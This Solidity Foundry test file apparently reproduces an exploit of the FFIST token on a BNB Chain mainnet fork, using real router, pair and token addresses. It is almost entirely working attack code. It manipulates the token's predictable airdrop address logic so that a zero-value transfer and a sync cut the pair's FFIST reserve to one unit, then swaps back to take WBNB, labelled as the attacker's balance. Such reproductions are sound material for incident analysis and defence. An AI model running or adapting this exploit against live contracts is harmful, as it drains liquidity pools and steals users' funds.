pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./interface.sol";

contract ContractTest is Test {

    IPancakeRouter02 public router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IPancakePair public pair = IPancakePair(0x7a3Adf2F6B239E64dAB1738c695Cf48155b6e152);
    address public attackContract = 0xB31c7b7BDf69554345E47A4393F53C332255C9Fb;
    IERC20 public wbnb = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 public ffist = IERC20(0x80121DA952A74c06adc1d7f85A237089b57AF347);
    IERC20 public busd = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        uint256 forkId = vm.createFork("bsc", 30113116);
        vm.selectFork(forkId);
    }

    function testExp() public {
        deal(address(wbnb), address(this), 0.01 ether);
        wbnb.approve(address(router), type(uint256).max);
        ffist.approve(address(router), type(uint256).max);
        console.log("block :%s", block.number);
        (uint112 reserve00, uint112 reserve01, ) = pair.getReserves();
        console.log("Pair rese: %s %s", reserve00, reserve01);

        address[] memory path = new address[](3);

        path[0] = address(wbnb);
        path[1] = address(busd);
        path[2] = address(ffist);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            10000000000000000,
            0,
            path,
            address(this),
            1689811626
        );
        address lastAirdropAddress = FakeToken(address(ffist)).lastAirdropAddress();
        console.log("lastAirdropAddress: %s", lastAirdropAddress);
        address to = address(uint160((uint160(lastAirdropAddress) | block.number) ^ (uint160(address(this)) ^ uint160(address(pair)))));
        console.log("To :%s ", to);
        uint256 seed = uint160(uint160(lastAirdropAddress) | block.number) ^ (uint160(address(this)) ^ uint160(to));
        address _pair = address(uint160(seed | 0));
        console.log("pair: %s", _pair);
        assertEq(_pair, address(pair));

        // vm.prank(attackContract);

        ffist.transfer(to, 0);

        pair.sync();
    
        console.log("Pair ffist balance: %s", ffist.balanceOf(address(pair)));
        assertEq(1, ffist.balanceOf(address(pair)));

        address[] memory path1 = new address[](3);

        (uint112 reserve0, uint112 reserve1, ) = pair.getReserves();
        console.log("Pair rese: %s %s", reserve0, reserve1);

        path1[0] = address(ffist);
        path1[1] = address(busd);
        path1[2] = address(wbnb);


        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            24,
            0,
            path1,
            address(this),
            1689811626
        );

        console.log("Attacker WBNB balance: %s", wbnb.balanceOf(address(this)));
    }
}